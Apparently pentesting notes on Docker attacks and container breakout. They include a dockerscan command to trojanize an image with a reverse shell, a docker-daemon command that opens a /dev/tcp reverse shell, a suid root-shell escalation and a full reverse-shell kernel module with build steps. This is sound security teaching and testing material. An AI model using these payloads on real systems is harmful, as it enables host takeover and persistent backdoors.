- [Background Information](#background-information)
  - [Attack Surface](#attack-surface)
  - [Exploiting Public Repositories](#exploiting-public-repositories)
  - [Backdooring Docker Images](#backdooring-docker-images)
  - [Docker Daemon Misconfigurations](#docker-daemon-misconfigurations)
    - [Enumerate Remote Docker Daemon API](#enumerate-remote-docker-daemon-api)
    - [Docker Host Privilege Escalation](#docker-host-privilege-escalation)
  - [Privilege Escalation and Container Breakout](#privilege-escalation-and-container-breakout)
    - [Mounted docker socket](#mounted-docker-socket)
    - [Writeable HostPath mount](#writeable-hostpath-mount)
    - [Abusing Linux Capabilities](#abusing-linux-capabilities)
      - [Privileged Flag](#privileged-flag)
      - [PoC Reverse shell kernel module](#poc-reverse-shell-kernel-module)
    - [Searching for Secrets](#searching-for-secrets)
  - [Automated Assessment tools](#automated-assessment-tools)
  - [Useful Links & References](#useful-links--references)

# Background Information

## Attack Surface
Typically within an organisation docker will not be running as a standalone service but as part of a cluster via a container orchestration tool - commonly Kubernetes or Docker Swarm. In this situation the attack surface is increased and other vectors will be introduced - For further information see Pentesting Kubernetes notes. 

Docker attack entrypoints:
- External attackers - Attempt to gain an initial foothold onto a container by exploiting an application running inside the container, i.e. vulnerable to RCE.
- Internal attackers / malicious insiders - Authenticated users with docker privileges or host access can abuse permissions and misconfigurations.
- Compromised containers - Backdoors, vulnerabilities and misconfigurations within container images can provide shell access, privilege escalation and container breakout vectors.

Further information regarding the attack surface, tactics and techniques can be found in the [ATT&CK Matrix](https://medium.com/mitre-engenuity/update-help-shape-att-ck-for-containers-bfcd24515df5)

## Exploiting Public Repositories
Docker images can be downloaded from public repositories such as 
Docker Hub where anyone can create a free account and upload images. As Docker does not check these images they may contain vulnerabilities either intentionally or not. As docker images are built in layers, there may be vulnerabilities within the application, it's dependancies or the underlying OS (base image).

Organisations should restrict images to secure trusted private repositories, where images are scanned for vulnerabilties before being stored. However it is worth trying to pull an image from docker hub to check if access is properly locked down. If you're able to pull from Docker Hub you can upload an arbitrary image containing vulnerabilities to exploit and attempt to breakout of the container.

An intentionally vulnerable image can be found at https://hub.docker.com/r/vulnerables/cve-2014-6271 this image is vulnerable to shellshock and can be used as a POC to show how exploiting an a vulnerability can provide an initial foothold into a container via RCE. **Note this is a vulnerable image and should only be used for training purposes**

## Backdooring Docker Images
It is possible to backdoor images manually, however The `Dockerscan` tool makes it easy to inject a reverse shell into a docker image. This docker image will still have the tag `latest` and the creation date will not be modified - the only way to detect it would be to inspect the image or diff the hash.

Install and setup dockerscan:
```
git clone https://github.com/cr0hn/dockerscan.git
Python install setup.py
export LC_ALL=C.UTF-8
export LANG=C.UTF-8
```

Example useage:

```
docker pull alpine # pull an image if not local
docker save alpine -o alpine-original # save the docker file 
dockerscan image modify trojanize alpine-original -l 172.17.0.1 -p 9001 -o alpine-trojan # backdoor image
docker load -i alpine-trojan.tar # load the image into docker
```
Now that the trojanized image is imported to docker, if the victim runs a docker container from it the reverse shell can be captured with nc e.g -  `nc -nlvp 9001`

## Docker Daemon Misconfigurations
The daemon listens on unix:///var/run/docker.sock but you can bind Docker to another host/port or Unix socket. The daemon can also be configured for remote access, by default the remote API listens on port 2375 and 2376 for unencrypted and encrypted communication. Also by default, Dockerd does not require authentication allowing an attacker to start a container and get a shell.

The following command will start a shell mounting the root directory of the host to the container, from here it would be possible to write to /etc/shadow or add an SSH key:
```
docker -H <remoteapi>:2375 run — rm -v /:/mnt <image> chroot /mnt /bin/bash -c “bash -i >& /dev/tcp/192.168.1.130/4444 0>&1
```
    
It would also be possible to start a privileged container - see [Abusing Linux Capabilities](#abusing-linux-capabilities)

### Enumerate Remote Docker Daemon API
- Using Nmap
```
nmap -p 2375,2376 <IP> 

nmap -p- -sV --script docker-* <IP>
```

- Using Metasploit
```
msf> use exploit/linux/http/docker_deamon_tcp
```

- Using Curl
```
#check version
curl -s http://open.docker.socket:2375/version | jq

#list containers
curl -insecure https://tlsopen.docker.socket:2376/containers/json | jq
```

- Using Docker binary
```
docker -H open.docker.socket:2375/version
```

Further information regarding abusing docker sockets can be found here:
https://securityboulevard.com/2019/02/abusing-docker-api-socket/

### Docker Host Privilege Escalation
By default the Docker daemon runs with root privlieges to perform operations, for security, users will generally add themselves to the docker group instead of running as root. However it is possible to leverage docker volumes and suid binaries to escalate a user with docker group access to root.

PoC:

Create the following files
- dockerfile
```
FROM alpine:3.5
COPY root.sh root.sh
COPY rootshell rootshell
```
- rootshell.c
```
int main()
{
   setuid( 0 );
   system( "/bin/sh" );
   return 0;
}
```
- root.sh
```
#!/bin/sh

cp rootshell /persist/rootshell
chmod 4777 /persist/rootshell
```

Exploitation:
- Compile rootshell.c
- Build the dockerfile - `docker build --rm -t privesc .`
- Run the dockerfile mounting a share - `docker run -v /tmp/persist:/persist privesc:latest /bin/sh root.sh`
- navigate to share on host - `cd /tmp/persist`
- execute the suid binary `./rootshell`

## Privilege Escalation and Container Breakout
### Mounted docker socket
Though rare, if for some reason the application needs to connect to a docker socket it may be mounted to the container and can be used to escape:
```
find / -name docker.sock 2>/dev/null
# usually /run/docker.sock
```
If the socket is mounted you can communicate with the docker daemon using the docker binary or curl to execute docker commands - see [Docker Daemon Misconfigurations](#docker-daemon-misconfigurations)

### Writeable HostPath mount
Hostpath mounts by definition mount a directory of the host to the container. You should check to see if there are any risky mount paths that could provide access to sensitive files (secrets, kubeconfigs, tokens etc...)if it's possible to write to the hostpath you may be able to find an exploit such as dropping an SSH key on the host.

### Abusing Linux Capabilities
By default docker assigns several linux capabilities to containers. If extra capabilities have been added (by running with the --cap-add flag) it may be possible to enumerate and exploit them to escapte the container.

Cap_sys_admin, cap_sys_ptrace and cap_sys_module are the most privileged capabilities to check for, if cap_sys_admin is enabled it is possible to add further capabilities.

For further information see Privileged flag below:

#### Privileged Flag
Running a container image with the `--privileged` flag provides a container with all the root capabilities of the host machine, as discussed above, its possible to access resources and write to the kernel space to break out of the container. It’s notable to mention that other isolation techniques such as cgroups, AppArmor, and SECcomp are also disabled with privileged flag set.

Check capabilities:
```
caphsh --print
# You may need to install libcap (apk add -U lib)
```

If the container has privileged capabilities it may be possible to load kernel modules and write to the kernel space to get a reverse shell on the host:

#### PoC Reverse shell kernel module

Install linux headers:
```
sudo apt-get install -y build-essential linux-headers-$(uname -r)
```

Reverseshell_module.c:
```
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kmod.h>

static char command[] = "bash -i >& /dev/tcp/172.17.0.1/8888 0>&1"; //Reverse shell change ip and port if needed

char *argv[] = {
    "/bin/bash",
    "-c",    // flag make command run from option list
    command, // Reverse shell
    NULL     // End of the list
};
static char *envp[] = {
    "HOME=/",
    NULL // End of the list
};

static int __init connect_back_init(void)
{

    return call_usermodehelper(
        argv[0],      // execution path
        argv,         // arguments for process
        envp,         // environment for process
        UMH_WAIT_EXEC // don't wait for program return status
    );
}

static void __exit connect_back_exit(void)
{
    printk(KERN_INFO "Exiting\n");
}

module_init(connect_back_init);
module_exit(connect_back_exit);
```

Makefile:
```
obj-m += reverseshell_module.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) clean
```
Required Steps:
- install linux headers
- create reverseshell_module.c
- change IP/Port as required
- create makefile
- build exploit with `make`
- copy reverseshell_module.ko to container
- make executable `chmod +x`
- set up listener `nc -nlvp 8888`
- load reverseshell kernel module - `insmod reverseshell_module.ko`

Kernel module commands
- `lsmod` - list modules
- `insmod` - load module
- `rmmod` - unload modules

### Searching for Secrets
Secrets management is a challenge within docker and devops in general. There are many recommended ways to store secrets however its still common to find secrets embedded within multiple insecure locations:

- dockerfile
- source code
- environmental variables
- text files
- etc..
  
In this case anyone with access to the container can read these serets.

Additionally, if you are able to access the host, you may be able to find secrets hidden in other containers

-  Docker inspect:
```
docker inspect database -f "{{json .Config.Env}}"
```
- Docker Secrets: https://github.com/JOSHUAJEBARAJ/docker-secrets
- Detect Secrets: https://github.com/ibm/detect-secrets

## Automated Assessment tools
- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) - Privilege escalation scanner which can also be used to enumerate containers.  
  
- [Amicontained](https://github.com/genuinetools/amicontained) - Container introspection tool, can be used to find out what container runtime is being used as well as the features available.
  
- [Deepce](https://github.com/stealthcopter/deepce) - Tool to perform docker enumeration as well as escalation of privileges and container escapes
  
- [CDK - Container Penetration Toolkit](https://github.com/cdk-team/CDK#installationdelivery) - Open-sourced container penetration toolkit, designed for offering stable exploitation in different containers without any OS dependency

- [Trivy](https://github.com/aquasecurity/trivy) - Vulnerability Scanner for container images. Can also be used to detect vulnerabilities and misconfigurations of file systems, IaC and Git repos and should be employed within DevSecOps pipelines.
  
- [Grype](https://github.com/anchore/grype) - Vulnerability scanner for containers.

- [Docker bench security](https://github.com/docker/docker-bench-security) - Docker CIS benchmark compliance scanner, checks for common best practices for deploying containers in production environments.

## Useful Links & References
https://github.com/cr0hn/dockerscan

https://www.trendmicro.com/en_gb/research/19/l/why-running-a-privileged-container-in-docker-is-a-bad-idea.html

https://www.electricmonk.nl/log/2017/09/30/root-your-docker-host-in-10-seconds-for-fun-and-profit/

https://blog.container-solutions.com/linux-capabilities-in-practice

https://greencashew.dev/posts/how-to-add-reverseshell-to-host-from-the-privileged-container/

https://madhuakula.com/content/attacking-and-auditing-docker-containers-and-kubernetes-clusters/index.htmlexit

https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#capabilities